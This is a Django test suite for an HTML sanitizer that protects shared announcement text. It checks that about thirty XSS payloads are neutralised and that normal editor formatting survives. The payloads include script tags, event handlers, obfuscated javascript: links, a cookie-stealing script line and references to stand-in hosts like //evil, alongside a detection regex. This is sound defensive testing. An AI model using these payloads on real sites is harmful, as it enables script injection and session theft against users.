"""
Announcement text is written by one user and shown to everyone else with
|safe, so a script in it would run for every viewer (including HR admins).
These tests attack the cleaner directly with known script tricks, check
normal editor output survives, and check the three places it is applied:
when the form is saved, when the model is saved, and when the text is shown.
"""

import re
from pathlib import Path

from django import forms
from django.conf import settings
from django.template import Context, Template

from base.forms import AnnouncementForm
from base.html_sanitizer import sanitize_html
from base.models import Announcement
from horilla.isolated_testcase import IsolatedTestCase

# Anything in this pattern showing up in the output means the payload survived.
DANGEROUS = re.compile(
    r"<\s*(script|iframe|object|embed|svg|form|input|meta|base|link|style|body)\b"
    r"|javascript:|vbscript:|data:text|data:image/svg"
    r"|\bon\w+\s*="
    r"|expression\s*\(|behavior|-moz-binding|position\s*:",
    re.I,
)

ATTACKS = {
    "script block": "<p>hi</p><script>alert(1)</script>",
    "script, upper case, with src": "<SCRIPT SRC=//evil.js></SCRIPT>ok",
    "image error handler": "<img src=x onerror=alert(1)>",
    "svg onload": "<svg onload=alert(1)><circle/></svg>",
    "iframe": "<iframe src='javascript:alert(1)'></iframe>",
    "object and embed": "<object data='x.swf'></object><embed src='x'>",
    "link javascript:": "<a href='javascript:alert(1)'>x</a>",
    "link JaVaScRiPt mixed case": "<a href='JaVaScRiPt:alert(1)'>x</a>",
    "link with a tab inside the scheme": "<a href='java\tscript:alert(1)'>x</a>",
    "link with an encoded j": "<a href='&#106;avascript:alert(1)'>x</a>",
    "link with leading control character": "<a href='\x01 javascript:alert(1)'>x</a>",
    "link data:text/html": "<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>x</a>",
    "link vbscript": "<a href='vbscript:msgbox(1)'>x</a>",
    "image src javascript:": "<img src='javascript:alert(1)'>",
    "image src svg data": "<img src='data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='>",
    "image src html data": "<img src='data:text/html;base64,PHNjcmlwdD4='>",
    "style expression()": "<p style='width: expression(alert(1))'>x</p>",
    "style url(javascript:)": "<p style='background-color: url(javascript:alert(1))'>x</p>",
    "style behavior and binding": "<p style='behavior:url(x.htc); -moz-binding:url(x)'>x</p>",
    "style full-screen overlay": "<div style='position:fixed;top:0;left:0;width:100%;height:100%'>fake</div>",
    "body onload": "<body onload=alert(1)>x",
    "form with input": "<form action=//evil><input name=p><button>go</button></form>",
    "event handlers on an allowed tag": "<p onclick=alert(1) onmouseover=alert(2)>x</p>",
    "broken nested script": "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "comment trick": "<!--><script>alert(1)</script>-->",
    "style block": "<style>body{display:none}</style>text",
    "meta refresh": "<meta http-equiv='refresh' content='0;url=//evil'>",
    "base tag": "<base href='//evil/'>",
    "stylesheet link": "<link rel=stylesheet href=//evil/x.css>",
    "mutation-XSS shape": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
}

KEEPS = {
    "bold, italic, underline": (
        "<p>Hello <b>World</b> <i>x</i> <u>y</u></p>",
        ["<b>World</b>", "<i>x</i>", "<u>y</u>"],
    ),
    "lists": (
        "<ul><li>a</li></ul><ol><li>1</li></ol>",
        ["<ul>", "<li>a</li>", "<ol>"],
    ),
    "https link that opens in a new tab": (
        "<a href='https://example.com/x?a=1&b=2' target='_blank'>l</a>",
        ["https://example.com/x?a=1&amp;b=2", 'target="_blank"'],
    ),
    "mailto, tel, relative and anchor links": (
        "<a href='mailto:a@b.com'>m</a><a href='tel:+911234'>t</a>"
        "<a href='/employee/1/'>r</a><a href='#top'>h</a>",
        ["mailto:a@b.com", "tel:+911234", "/employee/1/", "#top"],
    ),
    "alignment, size, weight": (
        "<p style='text-align: center;'><span style='font-size: 18px; "
        "font-weight: bold;'>x</span></p>",
        ["text-align: center", "font-size: 18px", "font-weight: bold"],
    ),
    "hex colours": (
        "<span style='color:#ff0000; background-color:#eee'>x</span>",
        ["color:#ff0000", "background-color:#eee"],
    ),
    "table": (
        "<table border='1' style='width:100%'><thead><tr><th>H</th></tr></thead>"
        "<tbody><tr><td colspan='2'>1</td></tr></tbody></table>",
        ["<table", "<th>H</th>", 'colspan="2"'],
    ),
    "headings, quote, rule, code": (
        "<h2>T</h2><blockquote>q</blockquote><hr><pre>code</pre>",
        ["<h2>T</h2>", "<blockquote>", "<hr>", "<pre>"],
    ),
    "https image": (
        "<img src='https://example.com/a.png' alt='a' width='100'>",
        ["https://example.com/a.png", 'alt="a"'],
    ),
    "image from /media": ("<img src='/media/pic.png'>", ["/media/pic.png"]),
    "pasted-in png": (
        "<img src='data:image/png;base64,iVBORw0KGgo=' style='width: 50px;'>",
        ["data:image/png;base64,iVBORw0KGgo="],
    ),
    "old-editor font tag": (
        "<font color='red' face='Arial' size='4'>x</font>",
        ["<font", 'color="red"'],
    ),
    "non-latin text": ("<p>नमस्ते مرحبا 你好 ₹500</p>", ["नमस्ते مرحبا 你好 ₹500"]),
    "plain text": ("Just a plain sentence.", ["Just a plain sentence."]),
    "ampersand and less-than": ("<p>Q&amp;A: 5 &lt; 6</p>", ["Q&amp;A: 5 &lt; 6"]),
}


class SanitizerAttackTests(IsolatedTestCase):
    def test_every_known_script_trick_is_neutralised(self):
        for name, payload in ATTACKS.items():
            with self.subTest(name):
                self.assertNotRegex(sanitize_html(payload), DANGEROUS)

    def test_script_text_does_not_linger_as_visible_words(self):
        out = sanitize_html("<p>hi</p><script>steal(document.cookie)</script>")
        self.assertEqual(out, "<p>hi</p>")


class SanitizerKeepsNormalContentTests(IsolatedTestCase):
    def test_normal_editor_output_survives(self):
        for name, (html, must_contain) in KEEPS.items():
            with self.subTest(name):
                out = sanitize_html(html)
                for fragment in must_contain:
                    self.assertIn(fragment, out)

    def test_empty_values_pass_through(self):
        self.assertIsNone(sanitize_html(None))
        self.assertEqual(sanitize_html(""), "")


class AnnouncementFormTests(IsolatedTestCase):
    def _clean(self, description):
        form = AnnouncementForm()
        form.cleaned_data = {"description": description}
        return form.clean_description()

    def test_script_is_removed_when_the_form_is_cleaned(self):
        out = self._clean(
            "<p>Office closed Friday</p><script>alert(1)</script>"
            "<img src=x onerror=alert(2)>"
        )
        self.assertIn("Office closed Friday", out)
        self.assertNotRegex(out, DANGEROUS)

    def test_a_description_that_is_only_script_counts_as_empty(self):
        with self.assertRaises(forms.ValidationError):
            self._clean("<script>alert(1)</script>")


class AnnouncementModelTests(IsolatedTestCase):
    def test_saving_an_announcement_cleans_the_text(self):
        # Covers paths that never touch AnnouncementForm (imports, shell, API).
        announcement = Announcement.objects.create(
            title="Notice",
            description=(
                "<p>Hello</p><script>alert(1)</script>"
                "<a href='javascript:x()'>go</a>"
            ),
        )
        announcement.refresh_from_db()
        self.assertIn("Hello", announcement.description)
        self.assertNotRegex(announcement.description, DANGEROUS)

    def test_a_missing_description_still_saves(self):
        announcement = Announcement.objects.create(title="No text", description=None)
        announcement.refresh_from_db()
        self.assertIsNone(announcement.description)


class AnnouncementDisplayTests(IsolatedTestCase):
    def _render(self, value):
        return Template("{% load basefilters %}{{ x|sanitize_html }}").render(
            Context({"x": value})
        )

    def test_display_filter_cleans_text_that_bypassed_saving(self):
        # e.g. rows stored before the write-time cleaning existed, or written
        # with QuerySet.update(), which never calls save().
        announcement = Announcement.objects.create(title="Old", description="<p>ok</p>")
        Announcement.objects.filter(pk=announcement.pk).update(
            description="<p>ok</p><script>alert(1)</script><img src=x onerror=alert(1)>"
        )
        announcement.refresh_from_db()
        self.assertIn("<script", announcement.description)  # really stored raw
        out = self._render(announcement.description)
        self.assertIn("<p>ok</p>", out)
        self.assertNotRegex(out, DANGEROUS)

    def test_display_filter_keeps_formatting_rather_than_escaping_it(self):
        self.assertIn("<b>bold</b>", self._render("<b>bold</b>"))

    def test_neither_announcement_template_uses_the_unsafe_filter_any_more(self):
        for relative in (
            "base/templates/announcement/announcement_one.html",
            "horilla_theme/templates/announcement/announcement_one.html",
        ):
            with self.subTest(relative):
                source = (Path(settings.BASE_DIR) / relative).read_text(
                    encoding="utf-8"
                )
                self.assertNotRegex(source, r"description\s*\|\s*safe")
                self.assertIn("description|sanitize_html", source)
